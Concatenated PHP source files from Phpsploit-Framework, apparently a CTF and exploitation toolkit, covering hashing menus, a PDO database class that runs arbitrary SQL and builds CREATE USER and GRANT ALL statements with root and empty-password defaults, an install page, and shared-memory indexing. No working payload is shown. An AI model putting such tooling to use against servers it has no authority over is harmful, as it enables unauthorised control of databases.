            foreach ( $_algos as $k => $v ) {
                $_form[ "selects" ][ 0 ][ "options" ][] = array ( "describe" => ( $v ) , "title" => ( $v ) , "value" => $v , "selected" => ( ( $_algo == $v ) ? "selected" : "" ) );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block_Keys extends Interface_Base
{
    const KEY             = 100000000000000001;
    const MAP_SIZE        = 1048576;
    const MAP_ITEM_SIZE   = 32;
    const MAP_ITEM_LIMIT  = 32768;
    const SIZE_BLOCK      = 1048712;
    const SIZE_BLOCK_KEY  = 16;
    const SIZE_BLOCK_SIZE = 16;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Security_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( ( ! isset( $params[ "encode" ] ) ) || ( ! is_array ( $params[ "encode" ] ) ) ) {
            $params[ "encode" ] = array ();
        }
        if ( ( ! isset( $params[ "encode" ][ "string" ] ) ) || ( ! is_string ( $params[ "encode" ][ "string" ] ) ) ) {
            $params[ "encode" ][ "string" ] = "";
        }
        if ( ( ! isset( $params[ "decode" ] ) ) || ( ! is_array ( $params[ "decode" ] ) ) ) {
            $params[ "decode" ] = array ();
        }
        if ( ( ! isset( $params[ "decode" ][ "string" ] ) ) || ( ! is_string ( $params[ "decode" ][ "string" ] ) ) ) {
            $params[ "decode" ][ "string" ] = "";
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "url" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/url" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "base64" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/base64" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "sha1" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/sha1" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "md5" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/md5" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "crc32" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/crc32" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "crypt" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/crypt" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "openssl" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/openssl" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "hash" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/hash" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "password_hash" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/password_hash" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
                array (
                    "title"    => "sodium" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/security/sodium" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
                ) ,
            );
        }

        if ( PHP_VERSION_ID >= 70200 ) {
            self::$_menu[] = array (
                "title"    => "hash_hmac" ,
                "describe" => "" ,
                "href"     => Class_Base_Response::get_url ( "/security/hash_hmac" , array ( "string" => $params[ "encode" ][ "string" ] , ) ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-1
 * Time: 下午3:58
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Database extends Class_Base
{
    const TYPE_DRIVE_MYSQL      = "mysql";
    const DOMAIN_LOCALHOST      = "127.0.0.1";
    const PORT_LOCALHOST        = 3306;
    const USER_LOCALHOST        = "root";
    const PASSWORD_LOCALHOST    = "";
    const CREATE_INIT_TEST_USER = "CREATE USER 'test'@'127.0.0.1' IDENTIFIED BY 'test';";

    private static $_connect       = null;
    private static $_sqls          = array ();
    private static $_executed_sqls = array ();
    private static $_error_infos   = array ();

    public static function sqls_string_to_sql_array ( $sqls_string )
    {
        $_sql_array = array ();
        $_items     = explode ( chr ( 59 ) , $sqls_string );
        foreach ( $_items as $index => $item ) {
            if ( ! empty( $item ) ) {
                $_sql_array[] = $item . chr ( 59 );
            }
        }
        return $_sql_array;
    }


    public static function append_sql ( $sql )
    {
        if ( ( ! empty( $sql ) ) && ( is_string ( $sql ) ) && ( substr ( $sql , ( strlen ( $sql ) - 1 ) , 1 ) == chr ( 59 ) ) ) {
            self::$_sqls[] = $sql;
        }
    }

    public static function set_sqls ( $sqls )
    {
        if ( ( ! empty( $sqls ) ) && ( is_array ( $sqls ) ) ) {
            if ( ! empty( self::$_sqls ) ) {
                self::$_sqls = array ();
            }
            foreach ( $sqls as $index => $sql ) {
                if ( ( ! empty( $sql ) ) && ( is_string ( $sql ) ) && ( substr ( $sql , ( strlen ( $sql ) - 1 ) , 1 ) == chr ( 59 ) ) ) {
                    self::$_sqls[] = $sql;
                }
            }
            self::$_sqls;
        }
    }

    public static function get_sqls ()
    {
        if ( ! is_array ( self::$_sqls ) ) {
            self::$_sqls = array ();
        }
        return self::$_sqls;
    }

    public static function append_executed_sql ( $sql )
    {
        if ( ( ! empty( $sql ) ) && ( is_string ( $sql ) ) && ( substr ( $sql , ( strlen ( $sql ) - 1 ) , 1 ) == chr ( 59 ) ) ) {
            self::$_executed_sqls[] = $sql;
        }
    }

    public static function get_executed_sqls ()
    {
        if ( ! is_array ( self::$_executed_sqls ) ) {
            self::$_executed_sqls = array ();
        }
        return self::$_executed_sqls;
    }

    private static function _set_error_info ( $pdo_statement = null , $sql = "" )
    {
        if ( ( empty( self::$_connect ) ) || ( ! is_object ( self::$_connect ) ) || ( ! ( self::$_connect instanceof \PDO ) ) ) {
            throw new \Exception( "database connection is error" , 0 );
        }
        if ( ( ! empty( $pdo_statement ) ) && ( is_object ( $pdo_statement ) ) && ( $pdo_statement instanceof \PDOStatement ) ) {
            $_error_info = $pdo_statement->errorInfo ();
        } else {
            $_error_info = self::$_connect->errorInfo ();
        }
        if ( ! empty( $_error_info ) ) {
            self::$_error_infos[] = array ( "sql" => $sql , "error_info" => array ( "sqlstate" => $_error_info[ 0 ] , "code" => $_error_info[ 1 ] , "message" => $_error_info[ 2 ] ) );
        }
    }

    public static function get_error_infos ()
    {
        return self::$_error_infos;
    }

    public static function get_create_init_test_user_sql_string ( $user , $password , $domain = "127.0.0.1" )
    {
        if ( ! Class_Base_Format::is_user_name ( $user ) ) {
            throw new \Exception( ( "user name is error , user : " . print_r ( $user , true ) ) , 0 );
        }
        if ( ! Class_Base_Format::is_user_password ( $password ) ) {
            throw new \Exception( ( "user password is error , password : " . print_r ( $password , true ) ) , 0 );
        }
        if ( ! Class_Base_Format::is_domain_name ( $domain ) ) {
            throw new \Exception( ( "domain name is error , domain : " . print_r ( $domain , true ) ) , 0 );
        }
        $_sql = "CREATE USER '" . $user . "'@'" . $domain . "' IDENTIFIED BY '" . $password . "';";
        return $_sql;
    }

    public static function get_grant_all_string ( $user , $database , $table , $domain = "127.0.0.1" )
    {
        if ( ! Class_Base_Format::is_user_name ( $user ) ) {
            throw new \Exception( ( "user name is error , user : " . print_r ( $user , true ) ) , 0 );
        }
        if ( ! Class_Base_Format::is_database_name ( $database ) ) {
            throw new \Exception( ( "database name is error , database : " . print_r ( $database , true ) ) , 0 );
        }
        if ( ! Class_Base_Format::is_table_name ( $table ) ) {
            throw new \Exception( ( "table name is error , table : " . print_r ( $table , true ) ) , 0 );
        }
        if ( ! Class_Base_Format::is_domain_name ( $domain ) ) {
            throw new \Exception( ( "domain name is error , domain : " . print_r ( $domain , true ) ) , 0 );
        }
        $_sql = "GRANT ALL ON " . $database . "." . $table . " TO '" . $user . "'@'" . $domain . "';";
        return $_sql;
    }

    public static function connect ( $drive_type = self::TYPE_DRIVE_MYSQL , $domain = self::DOMAIN_LOCALHOST , $port = self::PORT_LOCALHOST , $user = self::USER_LOCALHOST , $password = self::PASSWORD_LOCALHOST , $options = array ( \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION ) )
    {
        try {
            $_dsn           = ( $drive_type . ':host=' . $domain . ';port=' . $port . ';' );
            self::$_connect = new \PDO( $_dsn , $user , $password , $options );
            return self::$_connect;
        } catch ( \PDOException $e ) {
            if ( is_cli () ) {
                Class_Base_Response::outputln ( $e );
            } else {
                Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( $e , true ) ) , "text" );
            }
            exit( 1 );
        }
    }

    public static function check_connect ()
    {
        if ( ( empty( self::$_connect ) ) || ( ! is_object ( self::$_connect ) ) || ( ! ( self::$_connect instanceof \PDO ) ) ) {
            throw new \Exception( "database connection is error" , 0 );
        }
    }

    public static function beginTransaction ()
    {
        self::check_connect ();
        $_bool = self::$_connect->beginTransaction ();
        return $_bool;
    }

    public static function commit ()
    {
        self::check_connect ();
        $_bool = self::$_connect->commit ();
        return $_bool;
    }

    public static function rollBack ()
    {
        self::check_connect ();
        $_bool = self::$_connect->rollBack ();
        return $_bool;
    }

    public static function query ( $sql )
    {
        self::check_connect ();
        if ( ( ! empty( $sql ) ) && ( is_string ( $sql ) ) && ( substr ( $sql , ( strlen ( $sql ) - 1 ) , 1 ) == chr ( 59 ) ) ) {
            self::append_executed_sql ( $sql );
            $_pdo_statement = self::$_connect->query ( $sql );
            if ( empty( $_pdo_statement ) ) {
                self::_set_error_info ( null );
                if ( is_cli () ) {
                    Class_Base_Response::output ( print_r ( self::get_error_infos () , true ) , "text" );
                } else {
                    Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( self::get_error_infos () , true ) ) , "text" );
                }
                exit( 1 );
            }
            $_results = $_pdo_statement->fetchAll ( ( \PDO::FETCH_COLUMN ) );
            if ( ! is_array ( $_results ) ) {
                self::_set_error_info ( null );
                if ( is_cli () ) {
                    Class_Base_Response::output ( print_r ( self::get_error_infos () , true ) , "text" );
                } else {
                    Class_Base_Response::output ( ( '<a href="' . urldecode ( Class_Base_Response::get_http_referer ( 1 ) ) . '">Return to the previous page ! </a>' . chr ( 10 ) . '<span>exception : </span>' . print_r ( self::get_error_infos () , true ) ) , "text" );
                }
                exit( 1 );
            }
            foreach ( $_results as $index => $items ) {
                if ( is_array ( $items ) ) {
                    foreach ( $items as $key => $item ) {
                        if ( Class_Base_Format::is_integer ( $key ) ) {
                            $items[ $key ] = null;
                            unset( $items[ $key ] );
                        }
                    }
                }
            }
            return $_results;
        }
        return false;
    }

    public static function exec ( $sql )
    {
        self::check_connect ();
        if ( ( ! empty( $sql ) ) && ( is_string ( $sql ) ) && ( substr ( $sql , ( strlen ( $sql ) - 1 ) , 1 ) == chr ( 59 ) ) ) {
            self::append_executed_sql ( $sql );
            $_count = self::$_connect->exec ( $sql );
            if ( $_count === false ) {
                self::_set_error_info ( null , $sql );
                throw new \Exception( print_r ( self::get_error_infos () , true ) , 0 );
            }
            return $_count;
        }
        return false;
    }

    public static function querys ( $sqls )
    {
        if ( is_array ( $sqls ) ) {
            $_results = array ();
            foreach ( $sqls as $index => $sql ) {
                if ( is_string ( $sql ) ) {
                    $_results[ $sql ] = self::query ( $sql );
                }
            }
            return $_results;
        }
        return false;
    }

    public static function execs ( $sqls )
    {
        if ( is_array ( $sqls ) ) {
            $_results = array ();
            foreach ( $sqls as $index => $sql ) {
                if ( is_string ( $sql ) ) {
                    $_results[ $sql ] = self::exec ( $sql );
                }
            }
            return $_results;
        }
        return false;
    }

    public static function query_sqls_string ( $sqls_string )
    {
        if ( is_string ( $sqls_string ) ) {
            $_sqls = self::sqls_string_to_sql_array ( $sqls_string );
            if ( ! empty( $_sqls ) ) {
                self::set_sqls ( $_sqls );
                $_results = self::querys ( $_sqls );
                return $_results;
            }
        }
        return false;
    }

    public static function exec_sqls_string ( $sqls_string )
    {
        if ( is_string ( $sqls_string ) ) {
            $_sqls = self::sqls_string_to_sql_array ( $sqls_string );
            if ( ! empty( $_sqls ) ) {
                self::set_sqls ( $_sqls );
                self::beginTransaction ();
                try {
                    $_results = self::execs ( $_sqls );
                    self::commit ();
                    return $_results;
                } catch ( \PDOException $e ) {
                    try {
                        self::rollBack ();
                    } catch ( \Exception $e ) {
                        return false;
                    }
                } catch ( \Exception $e ) {
                    try {
                        self::rollBack ();
                    } catch ( \Exception $e ) {
                        return false;
                    }
                }
            }
        }
        return false;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午3:11
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Init extends Class_View
{
    public static function init ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ( ! isset( $params[ "privilege_user" ] ) ) || ( ! is_string ( $params[ "privilege_user" ] ) ) || ( strlen ( $params[ "privilege_user" ] ) <= 0 ) ) {
                $params[ "privilege_user" ] = "";
            }
            if ( ( ! isset( $params[ "privilege_password" ] ) ) || ( ! is_string ( $params[ "privilege_password" ] ) ) || ( strlen ( $params[ "privilege_password" ] ) <= 0 ) ) {
                $params[ "privilege_password" ] = "";
            }
            $_cli_url        = Class_Base_Response ::get_cli_url ( "init_user_info" , array ( "privilege_user" => $params[ "privilege_user" ] , "privilege_password" => $params[ "privilege_password" ] ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_name      = "form_0";
            return ( Class_View ::form_page (
                array (
                    "title"   => "phpsploit-framework" ,
                    "content" => '<div style="height:16px;"></div><div style="line-height:32px;font-size:32px;text-align: center;">Initialize installation to PhpSploit - Framework</div><div style="height:32px;"></div>' ,
                ) ,
                array (
                    "action"    => "/init_user_info" ,
                    "id"        => $_form_name ,
                    "name"      => $_form_name ,
                    "inputs"    => array (
                        array (
                            "title"    => "Init User Name: " ,
                            "describe" => "Init User" ,
                            "name"     => "privilege_user" ,
                            "value"    => $params[ "privilege_user" ] ,
                        ) ,
                        array (
                            "title"    => "Init User Password : " ,
                            "describe" => "Init Password" ,
                            "name"     => "privilege_password" ,
                            "value"    => $params[ "privilege_password" ] ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"       => "cli_encode_url" ,
                            "title"    => "( Cli Encode URL )   : " ,
                            "name"     => "cli_encode_url" ,
                            "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                            "disabled" => "disabled" ,
                            "style"    => 'height:400px;' ,
                        ) ,
                        array (
                            "title"    => "Additional Service Terms ： " ,
                            "describe" => 'PhpSploit框架是专为善而非恶而设计的。如果您计划将此工具用于未经您执行评估的公司授权的恶意目的，则表示您违反了此工具集的服务条款和许可证。点击提交（一次，或者一次以上），即表示您同意服务条款，并且您只能将此工具用于合法目的。' ,
                            "name"     => "additional_service_terms" ,
                            "value"    => 'The PhpSploit-Framework is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting submit (once or more), you agree to the terms of service and that you will only use this tool for lawful purposes only.' ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "button"    => array (
                        "id"      => "button_form" ,
                        "type"    => "button" ,
                        "title"   => "( Create Connection Client Environment CLI Encode URL )" ,
                        "name"    => "button_form" ,
                        "value"   => "create cli encode url" ,
                        "display" => true ,
                        "events"  => array (
                            "onclick" => 'create_encode_url();' ,
                        ) ,
                    ) ,
                    "gets"      => array () ,
                ) ,
                array (
                    "menu"       => array (
                        array (
                            "title"    => "" ,
                            "describe" => "" ,
                            "href"     => "#" ,
                        ) ,
                    ) ,
                    "content"    => '<div></div>' ,
                    "javascript" => '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}function create_encode_url(){ document.getElementById("' . htmlentities ( $_form_name ) . '").action="' . Class_Base_Response ::get_url ( "/init" , array () ) . '";if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>' ,
                ) )
            );

        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block_UniqueIndex extends Class_Base_Block implements Interface_Base_Block_UniqueIndex
{
    private $_head     = null;
    private $_content  = null;
    private $_end_flag = null;

    public static function get_key ()
    {
        return Interface_Base_BlockKey::UNIQUE_INDEX;
    }

    public static function get_block ( $key )
    {
        $_block_id = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_BLOCK );
        if ( empty( $_block_id ) ) {
            throw new \Exception( "unique index block open is error" , 0 );
        }
        $_head = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::SIZE_BLOCK_HEAD , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( ! Class_Base_BlockHead::check_block_head_data ( $_head ) ) {
            $_head_object     = Class_Base_BlockHead::create_block_head ( self::NAME , self::KEY , self::SIZE_BLOCK_HEAD_CONTENT_SIZE , self::STATUS_BLOCK_ENABLED , self::MODE_BLOCK_READ_AND_WRITE , self::TYPE_BLOCK_UNIQUE_INDEX , self::TYPE_CONTENT_INTEGER , Class_Base_Format::string_to_reserved ( null , self::SIZE_BLOCK_HEAD_RESERVED ) , Class_Base_BlockHead::FLAG_BLOCK_HEAD_END );
            $_head            = $_head_object->get_block_string ();
            $_hex_index_start = Class_Base_Format::dec_to_hex ( self::INDEX_START );
            $_data_object     = Class_Base_BlockContent::create_block_content ( $_hex_index_start , self::SIZE_HEX_INTEGER );
            $_data            = $_data_object->get_block_string ();
            $_end_flag_object = Class_Base_BlockEndFlag::create_block_end_flag ( Class_Base_BlockHead::FLAG_BLOCK_HEAD_END );
            $_end_flag        = $_end_flag_object->get_block_string ();
            $_block_string    = ( $_head . $_data . $_end_flag );
            $_length          = Class_Base_Memory::write_share_memory ( $_block_id , $_block_string , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( empty( $_length ) ) {
                throw new \Exception( "unique index block init is error" , 0 );
            }
        }
        return $_block_id;
    }

    public static function clear_block ( $key )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + self::SIZE_HEX_INTEGER + self::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( ! empty( $_block_id ) ) {
            $_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( $_type == Interface_Base_BlockType::TYPE_BLOCK_UNIQUE_INDEX ) {
                $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , self::SIZE_BLOCK );
                return $_bool;
            }
        }
        return false;
    }

    public static function get_index ( $key )
    {
        $_block_id       = self::get_block ( $key );
        $_hex_index      = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , self::SIZE_HEX_INTEGER , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $_dec_index      = Class_Base_Format::hex_to_dec ( $_hex_index );
        $_dec_next_index = ( $_dec_index + 1 );
        if ( $_dec_next_index > self::INDEX_LIMIT ) {
            throw new \Exception( "unique index greater than limit , index ( " . $_dec_next_index . " ) " , 0 );
        }
        $_hex_next_index = Class_Base_Format::dec_to_hex ( $_dec_next_index );
        $_length         = Class_Base_Memory::write_share_memory ( $_block_id , $_hex_next_index , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_length ) ) {
            throw new \Exception( "unique index block autoincrement index is error" , 0 );
        }
        return $_dec_index;
    }

    public static function check_object_params ( $head , $content , $end_flag )
    {
        if ( ( ( ! is_object ( $head ) ) && ( ! is_string ( $head ) ) ) || ( ( ! is_object ( $content ) ) && ( ! is_string ( $content ) ) ) || ( ( ! is_object ( $end_flag ) ) && ( ! is_string ( $end_flag ) ) ) ) {
            throw new \Exception( "head or data or end_flag is not a string or object" , 0 );
        }
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            if ( ( ! ( $head instanceof Class_Base_BlockHead ) ) || ( ! ( $content instanceof Class_Base_BlockContent ) ) || ( ! ( $end_flag instanceof Class_Base_BlockEndFlag ) ) ) {
                throw new \Exception( "head or data or end_flag is error , head( " . print_r ( $head , true ) . " ) , data : ( " . $content . " ) , end_flag : ( " . $end_flag . " ) " , 0 );
            }
            if ( ( strlen ( $head->get_block_string () ) != Class_Base_BlockHead::get_head_size () ) || ( $content->get_content_size () != $head->get_content_size () ) || ( strlen ( $end_flag->get_block_string () ) != Class_Base_BlockEndFlag::get_end_flag_size () ) ) {
                throw new \Exception( "head size or data size or end_flag size is error" , 0 );
            }
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            if ( strlen ( $head ) != Class_Base_BlockHead::get_head_size () ) {
                throw new \Exception( "unique index block head size is error , head param size( " . strlen ( $head ) . " ) , head size ( " . Class_Base_BlockHead::get_head_size () . " ) " , 0 );
            }
            $_block_key = substr ( $head , Class_Base_BlockHead::get_head_block_key_offset () , Class_Base_BlockHead::get_head_block_key_size () );
            if ( Class_Base_Format::is_empty ( $_block_key ) || ( ! Class_Base_Format::is_min_to_max_hex ( $_block_key , Class_Base_Format::HEX_KEY_MIN_VALUE , Class_Base_Format::HEX_KEY_MAX_VALUE ) ) ) {
                throw new \Exception( "unique index block head key is error , key ( " . $_block_key . " ) " , 0 );
            }
            $_data_size = substr ( $head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () );
            $_data_size = Class_Base_Format::hex_to_dec ( $_data_size );
            if ( strlen ( $content ) != $_data_size ) {
                throw new \Exception( "unique index block data size is error , data param size ( " . strlen ( $content ) . " ) , data size ( " . $_data_size . " ) " , 0 );
            }
            if ( strlen ( $end_flag ) != Class_Base_BlockEndFlag::get_end_flag_size () ) {
                throw new \Exception( "unique index block end_flag size is error , end_flag param size ( " . strlen ( $end_flag ) . " ) , end_flag size ( " . Class_Base_BlockEndFlag::get_end_flag_size () . " ) " , 0 );
            }
        } else {
            throw new \Exception( "unique index block params is error ,  head ( " . print_r ( $head , true ) . " ) , data ( " . print_r ( $content , true ) . " ) , end_flag ( " . print_r ( $end_flag , true ) . " ) " , 0 );
        }
    }

    public function __construct ( $head , $content , $end_flag )
    {
        self::check_object_params ( $head , $content , $end_flag );
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            $this->_head     = $head->get_block_string ();
            $this->_content  = $content->get_block_string ();
            $this->_end_flag = $end_flag->get_block_string ();
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            $this->_head     = $head;
            $this->_content  = $content;
            $this->_end_flag = $end_flag;
        }
        parent::__construct ( $this->_head , $this->_content , $this->_end_flag );
    }

    public function __destruct ()
    {
        $this->_head     = null;
        $this->_content  = null;
        $this->_end_flag = null;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_head . $this->_content . $this->_end_flag );
        return $_block_string;
    }

    public function get_head_string ()
    {
        $_block_head_string = ( $this->_head );
        return $_block_head_string;
    }

    public function get_data_string ()
    {
        $_block_data_string = ( $this->_content );
        return $_block_data_string;
    }

    public function get_end_flag_string ()
    {
        $_block_end_flag_string = ( $this->_end_flag );
        return $_block_end_flag_string;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Database_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( ( ! isset( $params[ "database" ] ) ) || ( ! is_array ( $params[ "database" ] ) ) ) {
            $params[ "database" ] = array ();
        }
        if ( ( ! isset( $params[ "database" ][ "sql" ] ) ) || ( ! is_string ( $params[ "database" ][ "sql" ] ) ) ) {
            $params[ "database" ][ "sql" ] = "";
        }
        if ( ( ! isset( $params[ "database" ][ "" ] ) ) || ( ! is_string ( $params[ "database" ][ "sql" ] ) ) ) {
            $params[ "database" ][ "sql" ] = "";
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "query" ,
                    "describe" => "" ,
